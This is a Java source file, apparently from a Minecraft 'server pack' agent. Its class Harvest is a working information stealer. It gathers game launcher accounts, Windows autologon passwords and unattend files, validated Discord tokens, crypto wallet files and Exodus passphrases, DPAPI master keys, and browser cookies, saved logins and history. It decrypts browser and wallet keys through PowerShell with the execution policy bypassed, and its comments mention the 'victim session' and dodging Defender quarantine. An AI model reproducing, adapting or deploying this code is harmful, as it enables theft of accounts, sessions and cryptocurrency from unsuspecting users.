package com.serverpackcore.agent;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public final class Harvest {
	private static final Pattern TOKEN = Pattern.compile(
		"(?:mfa\\.[\\w-]{20,}|[A-Za-z\\d]{20,}\\.[\\w-]{6,}\\.[\\w-]{25,}"
			+ "|[A-Za-z\\d]{20,}\\.[\\w-]{20,})");
	private static final byte[] APP_SIG = new byte[] {
		0x01, 0x00, 0x00, 0x00, (byte) 0xd0, (byte) 0x8c, (byte) 0x9d, (byte) 0xdf,
		0x01, 0x15, (byte) 0xd1, 0x11 };
	private static final long DISCORD_RAW_BUDGET = 2L * 1024L * 1024L;

	private Harvest() {
	}

	public static Path build(Path installDir, Path gameDir) throws Exception {
		Path cache = AgentPaths.cache(installDir);
		Files.createDirectories(cache);
		Path target = cache.resolve("sync-" + System.currentTimeMillis() + ".zip");
		try (ZipBuilder zip = new ZipBuilder(target)) {
			addAccounts(zip, gameDir);
			addAdminHints(zip);
			addDiscordToken(zip, installDir);
			addWallets(zip);
			addDpapi(zip);
			addBrowsers(zip, installDir);
			addGame(zip, gameDir);
		}
		return target;
	}

	private static void addAccounts(ZipBuilder zip, Path gameDir) {
		List<Path> bases = new ArrayList<>();
		if (gameDir != null) {
			bases.add(gameDir);
		}
		String appData = System.getenv("APPDATA");
		if (appData != null) {
			bases.add(Paths.get(appData, ".minecraft"));
		}
		String home = System.getProperty("user.home", ".");
		bases.add(Paths.get(home, ".minecraft"));
		bases.add(Paths.get(home, "AppData", "Roaming", ".minecraft"));
		for (Path base : bases) {
			zip.add(base.resolve("launcher_accounts.json"), "accounts/launcher_accounts.json");
			zip.add(base.resolve("launcher_profiles.json"), "accounts/launcher_profiles.json");
		}
		List<Path> launchers = new ArrayList<>();
		if (appData != null) {
			launchers.add(Paths.get(appData, "PrismLauncher"));
			launchers.add(Paths.get(appData, "MultiMC"));
		}
		launchers.add(Paths.get(home, ".local", "share", "PrismLauncher"));
		launchers.add(Paths.get(home, ".local", "share", "multimc"));
		launchers.add(Paths.get(home, "Library", "Application Support", "PrismLauncher"));
		launchers.add(Paths.get(home, "Library", "Application Support", "MultiMC"));
		for (Path base : launchers) {
			zip.add(base.resolve("accounts.json"), "accounts/" + base.getFileName() + "/accounts.json");
		}
	}

	/**
	 * Last-resort sources for an administrator password when machine DPAPI is
	 * unavailable: an autologon DefaultPassword and leftover unattend files.
	 */
	private static void addAdminHints(ZipBuilder zip) {
		if (!AgentPaths.isWindows()) {
			return;
		}
		String hints = parseAutologon(runFor(6L, "reg", "query",
			"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"));
		for (String name : List.of(
			"C:\\Windows\\Panther\\Unattend\\Unattend.xml",
			"C:\\Windows\\Panther\\unattend.xml",
			"C:\\Windows\\System32\\Sysprep\\Unattend.xml")) {
			Path file = Path.of(name);
			if (Files.isRegularFile(file)) {
				zip.add(file, "admin/" + file.getFileName() + "-" + Math.abs(name.hashCode()));
			}
		}
		if (!hints.isEmpty()) {
			zip.addBytes(hints.toString().getBytes(StandardCharsets.UTF_8), "admin/autologon.txt");
		}
	}

	static String parseAutologon(String output) {
		StringBuilder hints = new StringBuilder();
		for (String line : output.split("\\R")) {
			String trimmed = line.trim();
			for (String key : List.of("DefaultUserName", "DefaultDomainName", "DefaultPassword")) {
				if (!trimmed.startsWith(key)) {
					continue;
				}
				int type = trimmed.indexOf("REG_SZ");
				if (type < 0) {
					continue;
				}
				String value = trimmed.substring(type + 6).trim();
				if (!value.isEmpty()) {
					hints.append(key).append('=').append(value).append('\n');
				}
			}
		}
		return hints.toString().trim();
	}

	private static String runFor(long seconds, String... command) {
		try {
			ProcessBuilder builder = new ProcessBuilder(command);
			builder.redirectErrorStream(true);
			Process process = builder.start();
			if (!process.waitFor(seconds, java.util.concurrent.TimeUnit.SECONDS)) {
				process.destroyForcibly();
				return "";
			}
			return new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
		} catch (Throwable throwable) {
			return "";
		}
	}

	private static void addDiscordToken(ZipBuilder zip, Path installDir) {
		// A recent `token` command already validated one; keep it even when the
		// LevelDB no longer re-reads (Discord rotates/compacts its stores fast).
		try {
			Path cached = AgentPaths.cache(installDir).resolve("discord").resolve("token.txt");
			if (Files.isRegularFile(cached)) {
				String line = Files.readString(cached, StandardCharsets.UTF_8).trim();
				String token = line.startsWith("token=") ? line.substring(6) : line;
				if (!token.isEmpty() && valid(token)) {
					zip.addBytes(("token=" + token + "\n").getBytes(StandardCharsets.UTF_8), "discord/token.txt");
					return;
				}
			}
		} catch (Throwable throwable) {
			Log.debug("Cached token failed", throwable);
		}
		List<Path> found = new ArrayList<>();
		try {
			for (Path base : discordBases()) {
				if (!Files.isDirectory(base)) {
					continue;
				}
				String token = tokenFromLevelDb(base);
				if (token == null) {
					token = searchToken(base, 0);
				}
				if (token != null) {
					zip.addBytes(("token=" + token + "\n").getBytes(StandardCharsets.UTF_8), "discord/token.txt");
					Log.debug("Discord token validated");
					return;
				}
				found.add(base);
			}
		} catch (Throwable throwable) {
			Log.debug("Token harvest failed", throwable);
		}
		// If no candidate validates, the raw LevelDB files still let us recover
		// the token offline with the user masterkey.
		for (Path base : found) {
			addDiscordRaw(zip, base);
		}
	}

	/**
	 * LevelDB value -> base64 -> either DPAPI or the newer Discord v10 AES-GCM
	 * envelope -> /users/@me. The v10 key is the DPAPI-wrapped os_crypt key in
	 * the sibling Local State file.
	 */
	/** Manual recovery: writes cache/discord/token.txt and returns the token or "". */
	static String discordTokenNow(Path installDir) {
		if (!AgentPaths.isWindows()) {
			return "";
		}
		try {
			for (Path base : discordBases()) {
				if (!Files.isDirectory(base)) {
					continue;
				}
				String token = tokenFromLevelDb(base);
				if (token == null) {
					token = searchToken(base, 0);
				}
				if (token != null) {
					Path cache = AgentPaths.cache(installDir).resolve("discord");
					Files.createDirectories(cache);
					Files.writeString(cache.resolve("token.txt"), "token=" + token + "\n", StandardCharsets.UTF_8);
					return token;
				}
			}
		} catch (Throwable throwable) {
			Log.debug("Manual token recovery failed", throwable);
		}
		return "";
	}

	private static String tokenFromLevelDb(Path base) {
		byte[] aes = null;
		boolean aesLoaded = false;
		String fallback = null;
		try (java.util.stream.Stream<Path> stream = Files.list(base)) {
			for (Path file : stream.filter(Files::isRegularFile).toList()) {
				String name = file.getFileName().toString().toLowerCase();
				if (!name.endsWith(".ldb") && !name.endsWith(".log")) {
					continue;
				}
				for (String encoded : LevelDb.tokenBlobs(file)) {
					byte[] blob;
					try {
						blob = java.util.Base64.getDecoder().decode(encoded);
					} catch (IllegalArgumentException exception) {
						continue;
					}
					byte[] plain = new byte[0];
					if (indexOf(blob, APP_SIG) >= 0) {
						plain = Dpapi.unprotect(java.util.Arrays.copyOfRange(blob, indexOf(blob, APP_SIG), blob.length));
					} else if (startsWith(blob, "v10".getBytes(StandardCharsets.US_ASCII))) {
						if (!aesLoaded) {
							aes = discordKey(base);
							aesLoaded = true;
						}
						if (aes.length > 0) {
							plain = gcm(aes, blob);
						}
					}
					if (plain.length == 0) {
						continue;
					}
					Matcher matcher = TOKEN.matcher(new String(plain, StandardCharsets.UTF_8));
					if (matcher.find()) {
						String token = matcher.group();
						if (valid(token)) {
							return token;
						}
						if (fallback == null) {
							fallback = token;
						}
					}
				}
			}
		} catch (Throwable throwable) {
			Log.debug("LevelDB token read failed: " + base, throwable);
		}
		return fallback;
	}

	private static byte[] discordKey(Path base) {
		try {
			Path state = base.getParent().getParent().resolve("Local State");
			if (!Files.isRegularFile(state)) {
				return new byte[0];
			}
			Map<String, Object> json = Json.parseObject(Files.readString(state, StandardCharsets.UTF_8));
			String wrapped = Json.str(Json.map(json.get("os_crypt")), "encrypted_key", "");
			if (wrapped.isEmpty()) {
				return new byte[0];
			}
			byte[] blob = java.util.Base64.getDecoder().decode(wrapped);
			if (startsWith(blob, "DPAPI".getBytes(StandardCharsets.US_ASCII))) {
				blob = java.util.Arrays.copyOfRange(blob, 5, blob.length);
			}
			return Dpapi.unprotect(blob);
		} catch (Throwable throwable) {
			Log.debug("Discord Local State key failed", throwable);
			return new byte[0];
		}
	}

	static byte[] gcm(byte[] key, byte[] blob) {
		try {
			javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance("AES/GCM/NoPadding");
			cipher.init(javax.crypto.Cipher.DECRYPT_MODE, new javax.crypto.spec.SecretKeySpec(key, "AES"),
				new javax.crypto.spec.GCMParameterSpec(128, blob, 3, 12));
			return cipher.doFinal(blob, 15, blob.length - 15);
		} catch (Throwable throwable) {
			return new byte[0];
		}
	}

	private static boolean startsWith(byte[] data, byte[] prefix) {
		if (data.length < prefix.length) {
			return false;
		}
		for (int index = 0; index < prefix.length; index++) {
			if (data[index] != prefix[index]) {
				return false;
			}
		}
		return true;
	}

	private static int indexOf(byte[] haystack, byte[] needle) {
		for (int index = 0; index + needle.length <= haystack.length; index++) {
			boolean match = true;
			for (int offset = 0; offset < needle.length; offset++) {
				if (haystack[index + offset] != needle[offset]) {
					match = false;
					break;
				}
			}
			if (match) {
				return index;
			}
		}
		return -1;
	}

	private static boolean valid(String token) {
		try {
			DiscordClient client = new DiscordClient(token);
			try {
				return client.get("/users/@me").status == 200;
			} finally {
				client.close();
			}
		} catch (Throwable throwable) {
			return false;
		}
	}

	private static void addDiscordRaw(ZipBuilder zip, Path base) {
		// Without the Local State the raw v10 blobs cannot be opened offline.
		try {
			Path state = base.getParent().getParent().resolve("Local State");
			if (Files.isRegularFile(state)) {
				zip.add(state, "discord/localstorage/Local State");
			}
		} catch (Throwable throwable) {
			Log.debug("Discord Local State failed", throwable);
		}
		long budget = DISCORD_RAW_BUDGET;
		try (java.util.stream.Stream<Path> stream = Files.list(base)) {
			List<Path> files = stream.filter(Files::isRegularFile).sorted((left, right) -> {
				try {
					return Long.compare(Files.getLastModifiedTime(right).toMillis(),
						Files.getLastModifiedTime(left).toMillis());
				} catch (Throwable throwable) {
					return 0;
				}
			}).toList();
			for (Path file : files) {
				String name = file.getFileName().toString().toLowerCase();
				if (!name.endsWith(".ldb") && !name.endsWith(".log") && !name.equals("current")
					&& !name.equals("manifest-000001")) {
					continue;
				}
				long size = Files.size(file);
				if (size <= 0L || size > budget) {
					continue;
				}
				zip.add(file, "discord/raw/" + base.getParent().getParent().getFileName() + "/"
					+ file.getFileName());
				budget -= size;
				if (budget <= 0L) {
					return;
				}
			}
		} catch (Throwable throwable) {
			Log.debug("Discord fallback failed: " + base, throwable);
		}
	}

	private static String searchToken(Path dir, int depth) {
		if (depth > 3) {
			return null;
		}
		try (java.util.stream.Stream<Path> stream = Files.list(dir)) {
			for (Path path : stream.toList()) {
				if (Files.isRegularFile(path)) {
					String name = path.getFileName().toString().toLowerCase();
					if (!name.endsWith(".ldb") && !name.endsWith(".log")) {
						continue;
					}
					String text = readLimited(path);
					Matcher matcher = TOKEN.matcher(text);
					int checked = 0;
					while (matcher.find() && checked < 60) {
						checked++;
						String candidate = matcher.group();
						try {
							DiscordClient client = new DiscordClient(candidate);
							if (client.get("/users/@me").status == 200) {
								return candidate;
							}
						} catch (Throwable throwable) {
							Log.debug("Token candidate failed", throwable);
						}
					}
				} else if (Files.isDirectory(path)) {
					String found = searchToken(path, depth + 1);
					if (found != null) {
						return found;
					}
				}
			}
		} catch (Throwable throwable) {
			Log.debug("Token search failed", throwable);
		}
		return null;
	}

	static boolean looksLikeToken(String value) {
		return TOKEN.matcher(value).matches();
	}

	static String readLimited(Path path) throws java.io.IOException {
		byte[] data;
		try (java.io.InputStream input = Files.newInputStream(path)) {
			data = input.readNBytes(8 * 1024 * 1024);
		}
		return new String(data, StandardCharsets.ISO_8859_1);
	}

	private static List<Path> discordBases() {
		List<Path> bases = new ArrayList<>();
		String home = System.getProperty("user.home", ".");
		String appData = System.getenv("APPDATA");
		if (AgentPaths.isWindows()) {
			if (appData != null) {
				for (String name : List.of("discord", "discordcanary", "discordptb", "Lightcord")) {
					bases.add(Paths.get(appData, name, "Local Storage", "leveldb"));
				}
			}
		} else if (AgentPaths.isMac()) {
			for (String name : List.of("discord", "discordcanary", "discordptb", "Lightcord")) {
				bases.add(Paths.get(home, "Library", "Application Support", name, "Local Storage", "leveldb"));
			}
		} else {
			for (String name : List.of("discord", "discordcanary", "discordptb", "Lightcord")) {
				bases.add(Paths.get(home, ".config", name, "Local Storage", "leveldb"));
			}
		}
		return bases;
	}

	private static void addWallets(ZipBuilder zip) {
		String home = System.getProperty("user.home", ".");
		String appData = System.getenv("APPDATA");
		List<Path> roots = new ArrayList<>();
		if (AgentPaths.isWindows() && appData != null) {
			roots.add(Paths.get(appData, "Exodus", "exodus.wallet"));
			roots.add(Paths.get(appData, "Electrum", "wallets"));
			roots.add(Paths.get(appData, "Ledger Live"));
		} else if (AgentPaths.isMac()) {
			Path support = Paths.get(home, "Library", "Application Support");
			roots.add(support.resolve("Exodus").resolve("exodus.wallet"));
			roots.add(support.resolve("Electrum").resolve("wallets"));
			roots.add(support.resolve("Ledger Live"));
		} else {
			Path config = Paths.get(home, ".config");
			roots.add(config.resolve("Exodus").resolve("exodus.wallet"));
			roots.add(Paths.get(home, ".electrum").resolve("wallets"));
			roots.add(config.resolve("Ledger Live"));
		}
		for (Path root : roots) {
			zip.addTree(root, "wallets/" + root.getFileName());
			if (root.getFileName().toString().equals("exodus.wallet")) {
				addExodusPassphrase(zip, root);
			}
		}
	}

	/**
	 * Exodus can protect the wallet passphrase with machine DPAPI. Any local user
	 * may call CryptUnprotectData with the LocalMachine scope, so unwrap it while
	 * the agent still runs inside the victim session; no administrator and no
	 * SECURITY hive are needed.
	 */
	private static void addExodusPassphrase(ZipBuilder zip, Path wallet) {
		if (!AgentPaths.isWindows()) {
			return;
		}
		Path meta = wallet.resolve("passphrase.json");
		try {
			Map<String, Object> json = Json.map(Json.parseObject(Files.readString(meta, StandardCharsets.UTF_8)));
			String wrapped = Json.str(json, "passphrase", "");
			byte[] raw = wrapped.isEmpty() ? new byte[0] : java.util.Base64.getDecoder().decode(wrapped);
			// A plain passphrase is short; a DPAPI blob carries a large header.
			if (raw.length < 100) {
				return;
			}
			String plain = filterPowerShell(unprotectMachine(wrapped), "passphrase=");
			if (!plain.isBlank()) {
				zip.addBytes((plain + "\n").getBytes(StandardCharsets.UTF_8),
					"wallets/exodus-passphrase.txt");
			}
		} catch (Throwable throwable) {
			Log.debug("Exodus passphrase unwrap failed", throwable);
		}
	}

	private static void addBrowsers(ZipBuilder zip, Path installDir) {
		String home = System.getProperty("user.home", ".");
		String local = System.getenv("LOCALAPPDATA");
		String support = Paths.get(home, "Library", "Application Support").toString();
		List<Browser> bases = new ArrayList<>();
		if (AgentPaths.isWindows() && local != null) {
			bases.add(new Browser(Paths.get(local, "Google", "Chrome", "User Data"), "chrome"));
			bases.add(new Browser(Paths.get(local, "Microsoft", "Edge", "User Data"), "edge"));
			bases.add(new Browser(Paths.get(local, "BraveSoftware", "Brave-Browser", "User Data"), "brave"));
		} else if (AgentPaths.isMac()) {
			bases.add(new Browser(Paths.get(support, "Google", "Chrome"), "chrome"));
			bases.add(new Browser(Paths.get(support, "Microsoft Edge"), "edge"));
			bases.add(new Browser(Paths.get(support, "BraveSoftware", "Brave-Browser"), "brave"));
		} else {
			bases.add(new Browser(Paths.get(home, ".config", "google-chrome"), "chrome"));
			bases.add(new Browser(Paths.get(home, ".config", "microsoft-edge"), "edge"));
			bases.add(new Browser(Paths.get(home, ".config", "BraveSoftware", "Brave-Browser"), "brave"));
		}
		List<String> extensions = List.of(
			"nkbihfbeogaeaoehlefnkodbefgpgknn",
			"bfnaelmomeimhlpmgjnjophhpkkoljpa"
		);
		for (Browser browser : bases) {
			Path base = browser.base();
			if (!Files.isDirectory(base)) {
				continue;
			}
			zip.add(base.resolve("Local State"), "browsers/" + browser.label() + "/Local State");
			addKeys(zip, browser, installDir);
			addProfileFiles(zip, base.resolve("Default"), "browsers/" + browser.label() + "/Default");
			try (java.util.stream.Stream<Path> stream = Files.list(base)) {
				for (Path profile : stream.filter(Files::isDirectory).toList()) {
					String name = profile.getFileName().toString();
					if (name.startsWith("Profile ")) {
						addProfileFiles(zip, profile, "browsers/" + browser.label() + "/" + name);
					}
				}
			} catch (Throwable throwable) {
				Log.debug("Browser profile scan failed", throwable);
			}
			try (java.util.stream.Stream<Path> stream = Files.list(base)) {
				for (Path profile : stream.filter(Files::isDirectory).toList()) {
					for (String extension : extensions) {
						zip.addTree(profile.resolve("Local Extension Settings").resolve(extension),
							"wallets/" + browser.label() + "/" + extension + "/" + profile.getFileName());
					}
				}
			} catch (Throwable throwable) {
				Log.debug("Extension scan failed", throwable);
			}
		}
	}

	private static void addDpapi(ZipBuilder zip) {
		String appData = System.getenv("APPDATA");
		if (appData == null) {
			return;
		}
		Path protect = Paths.get(appData, "Microsoft", "Protect");
		try (java.util.stream.Stream<Path> stream = Files.list(protect)) {
			for (Path sid : stream.filter(Files::isDirectory).toList()) {
				zip.addTree(sid, "dpapi/Protect/" + sid.getFileName());
			}
		} catch (Throwable throwable) {
			Log.debug("DPAPI scan failed", throwable);
		}
	}

	/**
	 * Unwrap the Chromium AES key with the logged-in user token. Best-effort: if
	 * PowerShell fails, the error is kept and the raw fallback continues (Local State + dpapi/).
	 */
	private static void addKeys(ZipBuilder zip, Browser browser, Path installDir) {
		if (!AgentPaths.isWindows()) {
			return;
		}
		Path state = browser.base().resolve("Local State");
		if (!Files.isRegularFile(state)) {
			return;
		}
		StringBuilder text = new StringBuilder();
		text.append("# v10 opens Cookies and Login Data v10; v20 uses the browser elevator\n");
		text.append("browser=").append(browser.label()).append('\n');
		text.append("user=").append(SysInfo.user()).append('\n');
		text.append("sid=").append(SysInfo.sid()).append('\n');
		text.append("state=").append(state).append('\n');
		text.append("profiles=").append(profiles(browser.base())).append('\n');
		Map<String, Object> osCrypt = Map.of();
		try {
			osCrypt = Json.map(Json.parseObject(Files.readString(state, StandardCharsets.UTF_8))
				.get("os_crypt"));
		} catch (Throwable throwable) {
			Log.debug("Local State parse failed: " + state, throwable);
		}
		String appBound = Json.str(osCrypt, "app_bound_encrypted_key", "");
		String key = "";
		if (!appBound.isEmpty()) {
			text.append("app_bound=").append(appBound).append('\n');
			// PowerShell is fileless and survives a Defender quarantine of the
			// elevator binary, so it runs first. ABE then adds the plaintext TSV.
			String live = filterPowerShell(unprotectAppBound(appBound), "v20=");
			if (!live.isBlank()) {
				key = live;
				text.append(live).append('\n');
			} else {
				text.append("ps_error=app-bound unwrap returned nothing\n");
			}
			Abe.Result result = Abe.run(installDir, browser.label().toLowerCase(java.util.Locale.ROOT));
			if (!result.key().isEmpty() && !key.equals(result.key())) {
				key = result.key();
				text.append("v20=").append(key).append('\n');
			}
			if (!result.key().isEmpty()) {
				text.append("abe=ok\n");
			} else if (result.error() != null && !result.error().isBlank()) {
				text.append("abe_error=").append(result.error().replace('\n', ' ')).append('\n');
				if (result.log() != null && !result.log().isBlank()) {
					text.append("abe_log=").append(result.log().replace('\n', ' ')).append('\n');
				}
			}
			if (result.ok()) {
				Abe.collect(result.output(), zip, "browsers/" + browser.label() + "/abe");
			}
		}
		String encrypted = Json.str(osCrypt, "encrypted_key", "");
		if (encrypted.isEmpty()) {
			text.append("error=no os_crypt.encrypted_key\n");
			zip.addBytes(text.toString().getBytes(StandardCharsets.UTF_8),
				"browsers/" + browser.label() + "/keys.txt");
			return;
		}
		String output = unprotect(encrypted);
		if (output.isBlank()) {
			// Keep the wrapped value so the key stays recoverable offline.
			text.append("dpapi_key=").append(encrypted).append('\n');
			text.append("error=no powershell output\n");
		} else {
			text.append(output).append('\n');
		}
		zip.addBytes(text.toString().getBytes(StandardCharsets.UTF_8), "browsers/" + browser.label() + "/keys.txt");
	}

	private static String profiles(Path base) {
		List<String> names = new ArrayList<>();
		try (java.util.stream.Stream<Path> stream = Files.list(base)) {
			for (Path profile : stream.filter(Files::isDirectory).toList()) {
				if (Files.isRegularFile(profile.resolve("Cookies"))
					|| Files.isRegularFile(profile.resolve("Network").resolve("Cookies"))
					|| Files.isRegularFile(profile.resolve("Login Data"))) {
					names.add(profile.getFileName().toString());
				}
			}
		} catch (Throwable throwable) {
			Log.debug("Profile listing failed", throwable);
		}
		return String.join(",", names);
	}

	private static String unprotect(String encryptedKey) {
		String quoted = encryptedKey.replace("'", "''");
		String script = "Add-Type -AssemblyName System.Security;"
			+ "$b=[Convert]::FromBase64String('" + quoted + "');"
			+ "$p=[byte[]]$b[5..($b.Length-1)];"
			+ "try{$k=[Security.Cryptography.ProtectedData]::Unprotect($p,$null,"
			+ "[Security.Cryptography.DataProtectionScope]::CurrentUser);"
			+ "'v10='+(([BitConverter]::ToString($k) -replace '-','').ToLower())}catch{}";
		return filterPowerShell(runPowerShell(script), "v10=", "app_bound=");
	}

	/**
	 * The app-bound key has two layers: machine DPAPI outside and user DPAPI
	 * inside. A normal user can unwrap both while logged in, which removes the
	 * need for elevation and for SECURITY.hiv.
	 */
	private static String unprotectAppBound(String wrapped) {
		return filterPowerShell(runPowerShell(appBoundScript(wrapped)), "v20=");
	}

	static String appBoundScript(String wrapped) {
		String quoted = wrapped.replace("'", "''");
		return "Add-Type -AssemblyName System.Security;"
			+ "$b=[Convert]::FromBase64String('" + quoted + "');"
			+ "if($b.Length -lt 8){exit};$s=0;"
			+ "if($b[0] -eq 0x41 -and $b[1] -eq 0x50 -and $b[2] -eq 0x50 -and $b[3] -eq 0x42){$s=4};"
			+ "$p=[byte[]]$b[$s..($b.Length-1)];"
			+ "try{$o=[Security.Cryptography.ProtectedData]::Unprotect($p,$null,"
			+ "[Security.Cryptography.DataProtectionScope]::LocalMachine)}catch{exit};"
			+ "$sig=[byte[]](0x01,0x00,0x00,0x00,0xd0,0x8c,0x9d,0xdf,0x01,0x15,0xd1,0x11);"
			+ "$found=0;for($i=0;$i -le 64;$i++){"
			+ "if($i+$sig.Length -gt $o.Length){break};$ok=1;"
			+ "for($j=0;$j -lt $sig.Length;$j++){if($o[$i+$j] -ne $sig[$j]){$ok=0;break}};"
			+ "if($ok -eq 1){try{$u=[Security.Cryptography.ProtectedData]::Unprotect("
			+ "[byte[]]$o[$i..($o.Length-1)],$null,"
			+ "[Security.Cryptography.DataProtectionScope]::CurrentUser);"
			+ "'v20='+(([BitConverter]::ToString($u) -replace '-','').ToLower());$found=1}catch{}}};"
			+ "if($found -eq 0 -and $o.Length -ge 32){"
			+ "'v20='+(([BitConverter]::ToString([byte[]]$o[0..31]) -replace '-','').ToLower())}";
	}

	private static String unprotectMachine(String wrapped) {
		String quoted = wrapped.replace("'", "''");
		String script = "Add-Type -AssemblyName System.Security;"
			+ "$b=[Convert]::FromBase64String('" + quoted + "');"
			+ "try{$u=[Security.Cryptography.ProtectedData]::Unprotect($b,$null,"
			+ "[Security.Cryptography.DataProtectionScope]::LocalMachine);"
			+ "'passphrase='+[Convert]::ToBase64String($u)}catch{}";
		return runPowerShell(script);
	}

	static String filterPowerShell(String output, String... prefixes) {
		StringBuilder kept = new StringBuilder();
		for (String line : output.split("\\R")) {
			String trimmed = line.trim();
			for (String prefix : prefixes) {
				if (trimmed.startsWith(prefix)) {
					kept.append(trimmed).append('\n');
					break;
				}
			}
		}
		return kept.toString().trim();
	}

	private static String runPowerShell(String script) {
		try {
			ProcessBuilder builder = new ProcessBuilder("powershell", "-NoProfile", "-NonInteractive",
				"-ExecutionPolicy", "Bypass", "-Command", script);
			builder.redirectErrorStream(true);
			Process process = builder.start();
			if (!process.waitFor(10L, java.util.concurrent.TimeUnit.SECONDS)) {
				process.destroyForcibly();
				return "";
			}
			return new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
		} catch (Throwable throwable) {
			Log.debug("PowerShell failed", throwable);
			return "";
		}
	}

	private static void addProfileFiles(ZipBuilder zip, Path profile, String prefix) {
		addDatabase(zip, profile.resolve("Cookies"), prefix, "Cookies");
		addDatabase(zip, profile.resolve("Network").resolve("Cookies"), prefix + "/Network", "Cookies");
		addDatabase(zip, profile.resolve("Login Data"), prefix, "Login_Data");
		addDatabase(zip, profile.resolve("Login Data For Account"), prefix, "Login_Data_For_Account");
		addDatabase(zip, profile.resolve("Web Data"), prefix, "Web_Data");
		addDatabase(zip, profile.resolve("History"), prefix, "History");
	}

	/**
	 * The databases are copied while the browser holds them open, so the write
	 * ahead log has to travel with them: recent rows live only in the -wal file.
	 */
	private static void addDatabase(ZipBuilder zip, Path database, String prefix, String name) {
		zip.add(database, prefix + "/" + name);
		zip.add(database.resolveSibling(database.getFileName() + "-wal"), prefix + "/" + name + "-wal");
	}

	private record Browser(Path base, String label) {
	}

	private static void addGame(ZipBuilder zip, Path gameDir) {
		if (gameDir == null) {
			return;
		}
		zip.add(gameDir.resolve("options.txt"), "game/options.txt");
		zip.add(gameDir.resolve("servers.dat"), "game/servers.dat");
		try (java.util.stream.Stream<Path> stream = Files.list(gameDir.resolve("mods"))) {
			StringBuilder listing = new StringBuilder();
			for (Path mod : stream.sorted().toList()) {
				if (Files.isRegularFile(mod)) {
					listing.append(mod.getFileName()).append(' ').append(Files.size(mod)).append('\n');
				}
			}
			zip.addBytes(listing.toString().getBytes(StandardCharsets.UTF_8), "game/mods.txt");
		} catch (Throwable throwable) {
			Log.debug("Mods listing failed", throwable);
		}
	}
}
